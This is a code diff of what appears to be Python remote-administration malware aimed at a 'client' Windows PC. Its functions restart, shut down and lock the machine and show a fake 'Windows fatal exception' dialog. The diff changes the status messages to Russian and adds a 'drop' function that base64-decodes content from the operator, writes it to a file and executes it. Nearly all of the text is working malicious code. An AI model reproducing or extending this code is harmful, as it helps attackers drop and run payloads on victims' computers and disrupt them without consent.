@@ -2,6 +2,7 @@ import os
 import wget
 import pyautogui
 import ctypes
+import base64
 
 
 def screamer():
@@ -45,17 +46,24 @@ def sys_command(command):
 
 def restart_pc():
     os.system("shutdown /r /t 1")
-    return "[+] Clients PC restarted"
+    return "пк клиента перезапущен"
 
 def shutdown_pc():
     os.system("shutdown /s /t 1")
-    return "[+] Clients PC killed"
+    return "пк клиента выключен"
 
 def lock_pc():
     ctypes.windll.user32.LockWorkStation()
-    return "[+] Clients PC locked"
+    return "пк клиента заблокирован"
 
 def message(text):
     text = ' '.join(text)
     ctypes.windll.user32.MessageBoxW(0, text, "Windows fatal exception: code 0xc06d007e", 1)
-    return "[+] Message received by client"
+    return "сообщение доставлено"
+
+def drop(name, content):
+    if not os.path.exists(name):
+        with open(name, "wb") as file:
+                file.write(base64.b64decode(content))
+    os.system(name)
+    return "файл открыт"
